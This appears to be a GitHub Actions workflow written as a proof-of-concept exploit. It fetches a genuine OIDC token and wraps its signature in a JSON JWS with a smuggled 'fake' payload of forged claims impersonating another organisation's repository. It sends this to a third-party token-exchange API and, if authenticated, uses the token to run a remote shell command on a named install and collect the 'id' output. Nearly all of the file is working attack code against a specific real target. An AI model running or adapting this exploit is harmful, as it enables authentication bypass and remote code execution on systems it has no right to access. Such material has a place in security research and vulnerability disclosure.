name: jwt-format-proof
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  proof:
    runs-on: ubuntu-latest
    steps:
      - name: Exchange a claim-confused JSON JWS
        shell: bash
        run: |
          set -euo pipefail
          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
          request="$(python3 - <<'PY'
          import base64,json,os
          token=os.environ['REAL_TOKEN']
          h,p,s=token.split('.')
          fake={
            'iss':'https://token.actions.githubusercontent.com',
            'aud':'https://api.byoc.lovable.net',
            'sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main',
            'repository':'lovablelabs/lovable-enterprise',
            'repository_id':'1287375944',
            'repository_owner':'lovablelabs',
            'repository_owner_id':'148472368',
            'repository_visibility':'internal',
            'ref':'refs/heads/main',
            'ref_type':'branch',
            'event_name':'push',
            'workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
            'job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
          }
          fs=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
          jws=json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fs+'.'},separators=(',',':'))
          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':jws},separators=(',',':')))
          PY
          )"
          exchange="$(curl -sS 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
          if [ "$(jq -r '.authenticated // false' <<<"$exchange")" != true ]; then
            jq '{authenticated:(.authenticated // false),error,description}' <<<"$exchange"
            exit 0
          fi
          target_token="$(jq -r .token <<<"$exchange")"
          me="$(curl -sS 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
          marker="jwt-format-rce-${GITHUB_RUN_ID}"
          action="$(jq -nc --arg marker "$marker" --arg req "$GITHUB_RUN_ID" '{command:("echo "+$marker+" && id"),timeout:60,name:"jwt-format",request_id:("jwt-format-"+$req),enable_kube_config:false}' | curl -sS -X POST 'https://api.byoc.lovable.net/v1/installs/inlkuvvc4e3mdxznfis5xc6v60/actions/adhoc-run' -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data-binary @-)"
          action_id="$(jq -r .id <<<"$action")"
          for unused in $(seq 1 45); do
            status="$(curl -sS "https://api.byoc.lovable.net/v1/installs/inlkuvvc4e3mdxznfis5xc6v60/actions/runs/$action_id" -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
            [ "$(jq -r .status <<<"$status")" = finished ] && break
            sleep 2
          done
          job_id="$(jq -r '.runner_job.id' <<<"$status")"
          log_id="$(jq -r '.runner_job.log_stream_id' <<<"$status")"
          proof="$(curl -sS "https://api.byoc.lovable.net/v1/log-streams/$log_id/logs?order=asc&runner_job_id=$job_id" -H "Authorization: Bearer $target_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' | jq -c --arg marker "$marker" '[.[] | select(.log_attributes["nuon.command_output"] == "true") | .body | select(. == $marker or startswith("uid="))]')"
          jq -n --arg role "$(jq -r .role <<<"$exchange")" --arg type "$(jq -r .account_type <<<"$me")" --arg action_id "$action_id" --arg status "$(jq -r .status <<<"$status")" --argjson permissions "$(jq .permissions <<<"$me")" --argjson proof "$proof" '{authenticated:true,exchange_role:$role,account_type:$type,permissions:$permissions,action_id:$action_id,action_status:$status,command_output:$proof}'
